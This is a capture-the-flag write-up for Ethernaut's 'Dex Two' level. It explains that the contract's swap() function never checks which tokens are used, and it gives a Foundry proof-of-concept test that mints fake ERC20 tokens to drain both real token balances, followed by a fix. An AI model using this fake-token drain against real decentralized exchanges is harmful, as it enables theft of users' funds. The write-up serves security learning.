# Level 23 - Dex Two

## Objectives

- Drain all balances of `token1` and `token2` from the `DexTwo` contract.

## Contract Overview

`DexTwo` is a contract or decentralized exchange platform that deals with token swapping and exchange. The `DexTwo` contract has a balance of 100 tokens each.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/DexTwo_slither.png)

## Finding the weak spots

The weak spot of the contract is function `swap()` that is missing checking that `from` and `to` are actually the whitelisted `token1` and `token2` tokens handled by the `DexTwo` contract.

```solidity
  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }
```

This means that there is a vulnerability in the `swap` function that allows an attacker to sell any arbitrary `from` token and receive the real `to` token from the decentralized exchange. As a result, the attacker can create a new ERC20 token and use it to gain some other tokens for free, without actually sending any real tokens to the `DexTwo`.

The idea is to create a new ERC20 token that is entirely owned and managed by the attacker, which means they can mint or burn tokens at will. The attacker can then use this new token to call the swap function and receive some other tokens in return without actually providing any real tokens.

To drain the `token1` and `token2` from the `DexTwo` contract, the attacker needs to find the correct amount of the fake token to sell to receive 100 `token1`. The g`etSwapAmount` function is used to calculate the price of the swap. The attacker can use this function to determine the amount of fake token to sell to receive 100 `token1`. By doing some math, the attacker can determine the correct amount of fake token to sell to drain the `token1` and `token2` from the `DexTwo` contract with just one call to the swap function.

`100 token1 = amountOfFakeTokenToSell * 100 / DexBalanceOfFakeToken`

So to gain 100 token1 `amountOfFakeTokenToSell` and `DexBalanceOfFakeToken` has to be equal to 1.

## Potential attack scenario (hypothesis)

The idea is to create a new ERC20 token that is entirely owned and managed by the attacker, which means they can mint or burn tokens at will. The attacker can then use this new token to call the swap function and receive some other tokens in return without actually providing any real tokens.

## Plan of the attack and calculations

1. Attacker creates his own two ERC20 tokens and mint himself (`msg.sender`) 10 `fakeToken1` and 10 `fakeToken2`.
2. Attacker approves the `DexTwo` to spend 1 of his `fakeToken1` and 1 of his `fakeToken2`.
3. Attacker transfers 1 `fakeToken1` and 1 `fakeToken2` to `DexTwo` contract so that the price ratio is balanced to 1:1 when swapping.
4. Attacker calls `swap()` function twice (for each token) from `DexTwo` contract.
5. Attacker drains all balances of `token1` and `token2` from the `DexTwo` contract.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/23-DexTwo.t.sol))

```solidity
     // 1. Attacker creates his own two ERC20 tokens and mint himself (`msg.sender`) 10 `fakeToken1` and 10 `fakeToken2`.
        SwappableTokenTwo fakeToken1 = new SwappableTokenTwo(
            address(level),
            "Fake Token1",
            "FT1",
            10
        );

        SwappableTokenTwo fakeToken2 = new SwappableTokenTwo(
            address(level),
            "Fake Token2",
            "FT1",
            10
        );
        emit log_named_uint(
            "Balance of token1 before attack",
            level.balanceOf(address(token1), address(level))
        );
        emit log_named_uint(
            "Balance of token2 before attack",
            level.balanceOf(address(token2), address(level))
        );

        // 2. Attacker approves the `DexTwo` to spend 1 of his `fakeToken1` and 1 of his `fakeToken2`.
        fakeToken1.approve(address(level), 10);
        fakeToken2.approve(address(level), 10);

        // 3. Attacker transfers 1 `fakeToken1` and 1 `fakeToken2` to `DexTwo` contract so that the price ratio is balanced to 1:1 when swapping.
        fakeToken1.transfer(address(level), 1);
        fakeToken2.transfer(address(level), 1);

        // 4. Attacker calls `swap()` function twice (for each token) from `DexTwo` contract.
        level.swap(address(fakeToken1), address(token1), 1);
        level.swap(address(fakeToken2), address(token2), 1);

        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_named_uint(
            "Balance of token1 after attack",
            level.balanceOf(address(token1), address(level))
        );
        emit log_named_uint(
            "Balance of token2 before attack",
            level.balanceOf(address(token2), address(level))
        );

        // Assert that we have drained the Dex contract
        assertEq(
            token1.balanceOf(address(level)) == 0 &&
                token2.balanceOf(address(level)) == 0,
            true
        );
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/DexTwo.png)

## Recommendations

- There must be proper validations on the tokens allowed for swapping by the `DexTwo` for example we should use check: `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");`
- If user-listed tokens are allowed to be swapped, careful attention should be paid to business-critical logic so that they can't exploit the contract

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-22-solution-dex-two)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
